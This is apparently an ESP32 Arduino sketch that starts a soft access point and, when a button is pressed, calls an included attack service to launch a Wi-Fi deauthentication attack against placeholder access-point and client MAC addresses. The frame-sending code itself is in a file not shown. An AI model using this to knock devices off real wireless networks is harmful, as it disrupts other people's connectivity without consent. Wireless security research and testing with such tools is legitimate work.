#include <Arduino.h>

#include "Networks/Services/WifiService.h"
#include "Networks/Services/AttackService.h"
#include <Adafruit_NeoPixel.h>
#include <WiFi.h>

#define RGB_PIN     48      // Onboard RGB LED pin
#define NUM_PIXELS  1       // Only one LED

WifiService wifi;
AttackService attackService;

Adafruit_NeoPixel pixel(NUM_PIXELS, RGB_PIN, NEO_GRB + NEO_KHZ800);

void setup(){
    pixel.begin();
    pixel.setBrightness(2);
    Serial.begin(115200);
    Serial.println("Started");
    delay(500);
    
    pinMode(0, INPUT_PULLUP);

    wifi.setSoftAPConfig(DEFAULT_AP_CONFIG);

    wifi.softAP();

    delay(1000);

    IPAddress IP = WiFi.softAPIP();
    Serial.print("AP IP address: ");
    Serial.println(IP);

    uint32_t color = pixel.gamma32(pixel.ColorHSV(21845)); // Hue goes from 0 to 65535 for full cycle
    pixel.setPixelColor(0, color);
    pixel.show();
}

void loop(){
    
    
    if(!digitalRead(0)){
        MacAddress apMac = MacAddress::fromString("TARGET_AP");
        MacAddress staMac = MacAddress::fromString("TARGET_STA");
        
        uint32_t color = pixel.gamma32(pixel.ColorHSV(0)); // red | Hue goes from 0 to 65535 for full cycle
        pixel.setPixelColor(0, color);
        pixel.show();
        
        attackService.startDeauthAttack(apMac, staMac, 1000);
        
        color = pixel.gamma32(pixel.ColorHSV(21845)); // green
        pixel.setPixelColor(0, color);
        pixel.show();

        Serial.println(attackService.getExecutionTime());
    }
    // delay(1000);
    delay(100);
}